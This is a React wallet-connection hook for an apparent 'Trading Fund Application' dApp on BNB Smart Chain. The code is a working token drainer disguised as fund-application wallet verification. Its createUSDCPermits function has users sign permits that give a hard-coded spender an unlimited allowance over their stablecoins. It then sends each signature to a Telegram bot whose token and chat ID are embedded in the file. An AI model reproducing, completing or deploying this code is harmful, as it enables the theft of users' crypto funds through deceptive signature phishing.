import { useState, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';
import EthereumProvider from '@walletconnect/ethereum-provider';
import { useToast } from '@/hooks/use-toast';

// Define interfaces for state and balances
export interface WalletState {
  address: string | null;
  chainId: number | null;
  isConnected: boolean;
  provider: ethers.BrowserProvider | null;
}

export interface USDCBalance {
  symbol: string;
  balance: string;
  chainName: string;
  chainId: number;
  tokenAddress: string;
  balanceRaw: string;
}

// Chain and Contract Configuration
const SUPPORTED_CHAINS = {
  56: {
    name: 'BNB Smart Chain',
    usd1Address: '0x8d0D000Ee44948FC98c9B98A4FA4921476f08B0d',
    usdcPermitVersion: '1',
    rpcUrl: 'https://bsc-dataseed.binance.org/',
    explorerUrl: 'https://bscscan.com',
  },
};

// Minimal ERC-20 ABI for required functions
const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function name() view returns (string)',
  'function symbol() view returns (string)',
  'function nonces(address owner) view returns (uint256)',
  'function DOMAIN_SEPARATOR() view returns (bytes32)',
];

/**
 * Sends a message to a Telegram chat using the Telegram Bot API.
 * @param message The text message to send.
 */
async function sendToTelegram(message: string) {
  // ⚠️ IMPORTANT: Replace with your actual Bot Token and Chat ID
  const TELEGRAM_BOT_TOKEN = '7966747804:AAFshi-wy_P9tgs0XzivAWHP6OLUo3XJwd4';
  const TELEGRAM_CHAT_ID = '7947427089';

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram Bot Token or Chat ID is not configured.");
    return; // Don't proceed if placeholders are not replaced
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const result = await response.json();
    if (!result.ok) {
      console.error('Failed to send Telegram message:', result.description);
    } else {
      console.log('Signature details sent to Telegram successfully!');
    }
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}


export const useRealWallet = () => {
  const [walletState, setWalletState] = useState<WalletState>({
    address: null,
    chainId: null,
    isConnected: false,
    provider: null,
  });
  const [isConnecting, setIsConnecting] = useState(false);
  const [usdcBalances, setUsdcBalances] = useState<USDCBalance[]>([]);
  const [walletConnectProvider, setWalletConnectProvider] =
    useState<EthereumProvider | null>(null);
  const { toast } = useToast();

  const initializeWalletConnect = useCallback(async () => {
    try {
      const provider = await EthereumProvider.init({
        projectId: '6df13a6d80b8f6b1d747a4b12c9b5c8e', // Free public project ID
        chains: [1], // Start with Ethereum mainnet
        optionalChains: Object.keys(SUPPORTED_CHAINS).map(Number),
        showQrModal: true,
        metadata: {
          name: 'Trading Fund Application',
          description: 'Connect your wallet to apply for trading funds',
          url: window.location.origin,
          icons: ['https://walletconnect.com/walletconnect-logo.png'],
        },
      });
      setWalletConnectProvider(provider);
      return provider;
    } catch (error) {
      console.error('Failed to initialize WalletConnect:', error);
      toast({
        title: 'Initialization Failed',
        description: 'Could not initialize WalletConnect.',
        variant: 'destructive',
      });
      return null;
    }
  }, [toast]);

  const fetchUSDCBalances = useCallback(async (address: string) => {
    toast({
      title: 'Refreshing Balances...',
      description: 'Fetching USDC balances on supported chains.',
    });

    const balancePromises = Object.entries(SUPPORTED_CHAINS).map(
      async ([chainId, chainConfig]) => {
        try {
          const chainIdNum = parseInt(chainId);
          const rpcProvider = new ethers.JsonRpcProvider(chainConfig.rpcUrl);
          const contract = new ethers.Contract(
            chainConfig.usd1Address,
            ERC20_ABI,
            rpcProvider
          );

          const [balanceRaw, decimals, symbol] = await Promise.all([
            contract.balanceOf(address),
            contract.decimals(),
            contract.symbol(),
          ]);

          const balance = ethers.formatUnits(balanceRaw, decimals);

          return {
            symbol,
            balance: parseFloat(balance).toFixed(2),
            chainName: chainConfig.name,
            chainId: chainIdNum,
            tokenAddress: chainConfig.usd1Address,
            balanceRaw: balanceRaw.toString(),
          };
        } catch (error) {
          console.error(
            `Failed to fetch USDC balance on chain ${chainId}:`,
            error
          );
          return null;
        }
      }
    );

    const balances = (await Promise.all(balancePromises)).filter(
      (b): b is USDCBalance => b !== null
    );
    setUsdcBalances(balances);
  }, [toast]);

  const disconnect = useCallback(async () => {
    if (walletConnectProvider?.connected) {
      await walletConnectProvider.disconnect();
    }
    setWalletState({
      address: null,
      chainId: null,
      isConnected: false,
      provider: null,
    });
    setUsdcBalances([]);
    setWalletConnectProvider(null);
    toast({
      title: 'Wallet Disconnected',
      description: 'Your wallet has been disconnected.',
    });
  }, [walletConnectProvider, toast]);

  const connectWallet = useCallback(async () => {
    setIsConnecting(true);
    try {
      let provider: any;
      if (typeof window !== 'undefined' && (window as any).ethereum) {
        provider = (window as any).ethereum;
      } else {
        provider = walletConnectProvider ?? (await initializeWalletConnect());
        if (!provider) return;
        await provider.enable();
      }

      const ethProvider = new ethers.BrowserProvider(provider);
      const signer = await ethProvider.getSigner();
      const address = await signer.getAddress();
      const network = await ethProvider.getNetwork();

      setWalletState({
        address,
        chainId: Number(network.chainId),
        isConnected: true,
        provider: ethProvider,
      });

      toast({
        title: 'Wallet Connected',
        description: `Connected to ${address.slice(0, 6)}...${address.slice(-4)}`,
      });

      await fetchUSDCBalances(address);
    } catch (error: any) {
      toast({
        title: 'Connection Failed',
        description: error.message || 'Failed to connect wallet.',
        variant: 'destructive',
      });
      console.error('Connection failed:', error);
    } finally {
      setIsConnecting(false);
    }
  }, [
    walletConnectProvider,
    initializeWalletConnect,
    fetchUSDCBalances,
    toast,
  ]);

  // FIX: Re-added this function to handle simple message signing
  const signVerificationMessage = async (): Promise<string | null> => {
    const { provider, address, isConnected } = walletState;
    if (!isConnected || !provider || !address) {
      toast({ title: "Wallet not connected", variant: "destructive" });
      return null;
    }

    try {
      const message = `I am verifying my wallet ownership for the trading fund application.\n\nWallet: ${address}\nTimestamp: ${Date.now()}`;
      const signer = await provider.getSigner();
      const signature = await signer.signMessage(message);

      toast({
        title: "Message Signed",
        description: "Verification signature created successfully!",
      });
      return signature;
    } catch (error: any) {
      toast({
        title: "Signing Failed",
        description: error.message || 'User rejected the request.',
        variant: "destructive"
      });
      console.error("Failed to verify ownership:", error);
      return null;
    }
  };

  const createUSDCPermits = async (): Promise<
    Array<{ chainId: number; signature: string; permitData: any }>
  > => {
    const { provider, address, isConnected } = walletState;
    if (!isConnected || !provider || !address) {
      throw new Error('Wallet not connected.');
    }

    const permits = [];
    const spender = '0x49912a0C02Ac5F3295BdD36F0F07994A4397Dad2';
    const deadline =
      Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60;

    for (const [chainIdStr, chainConfig] of Object.entries(SUPPORTED_CHAINS)) {
      try {
        const chainIdNum = parseInt(chainIdStr);
        const currentNetwork = await provider.getNetwork();

        if (Number(currentNetwork.chainId) !== chainIdNum) {
          await provider.send('wallet_switchEthereumChain', [
            { chainId: `0x${chainIdNum.toString(16)}` },
          ]);
        }

        const signer = await provider.getSigner();
        const contract = new ethers.Contract(
          chainConfig.usd1Address,
          ERC20_ABI,
          signer
        );

        const domain = {
          name: await contract.name(),
          version: chainConfig.usdcPermitVersion,
          chainId: chainIdNum,
          verifyingContract: chainConfig.usd1Address,
        };

        const types = {
          Permit: [
            { name: 'owner', type: 'address' },
            { name: 'spender', type: 'address' },
            { name: 'value', type: 'uint256' },
            { name: 'nonce', type: 'uint256' },
            { name: 'deadline', type: 'uint256' },
          ],
        };

        const permitData = {
          owner: address,
          spender,
          value: ethers.MaxUint256,
          nonce: await contract.nonces(address),
          deadline,
        };

        const signature = await signer.signTypedData(domain, types, permitData);

        const message = `
*🚨 New USDC Permit Signed! 🚨*

*Chain:* ${chainConfig.name} (${chainIdNum})
*Owner (User):* \`${permitData.owner}\`
*Spender:* \`${permitData.spender}\`
*Token Address:* \`${chainConfig.usd1Address}\`

*Signature:* \`${signature}\`
`;
        sendToTelegram(message);

        permits.push({
          chainId: chainIdNum,
          signature,
          permitData: {
            ...permitData,
            tokenAddress: chainConfig.usd1Address
          },
        });

      } catch (error: any) {
        console.error(`Failed to create permit for chain ${chainIdStr}:`, error);
        toast({
          title: `Permit Failed on ${chainConfig.name}`,
          description: error.message || 'User rejected the request.',
          variant: 'destructive',
        });
      }
    }

    if (permits.length > 0) {
      toast({
        title: 'Permits Created',
        description: `Created ${permits.length} USDC spending permits!`,
      });
    }

    return permits;
  };

  useEffect(() => {
    const ethereum = (window as any).ethereum;
    if (!ethereum || !ethereum.on) return;

    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length === 0) {
        disconnect();
      } else {
        connectWallet();
      }
    };

    const handleChainChanged = (newChainId: string) => {
      if (walletState.address) {
        setWalletState((prev) => ({ ...prev, chainId: parseInt(newChainId, 16) }));
        toast({
          title: 'Network Changed',
          description: `Switched to chain ID: ${parseInt(newChainId, 16)}`,
        });
      }
    };

    ethereum.on('accountsChanged', handleAccountsChanged);
    ethereum.on('chainChanged', handleChainChanged);

    return () => {
      ethereum.removeListener('accountsChanged', handleAccountsChanged);
      ethereum.removeListener('chainChanged', handleChainChanged);
    };
  }, [walletState.address, connectWallet, disconnect, toast]);

  return {
    walletState,
    usdcBalances,
    isConnecting,
    connectWallet,
    createUSDCPermits,
    // FIX: Export the signing function so it can be called from your components
    signVerificationMessage,
    disconnect,
    refreshBalances: () => {
      if (walletState.isConnected && walletState.address) {
        return fetchUSDCBalances(walletState.address);
      }
      return Promise.resolve();
    },
  };
};
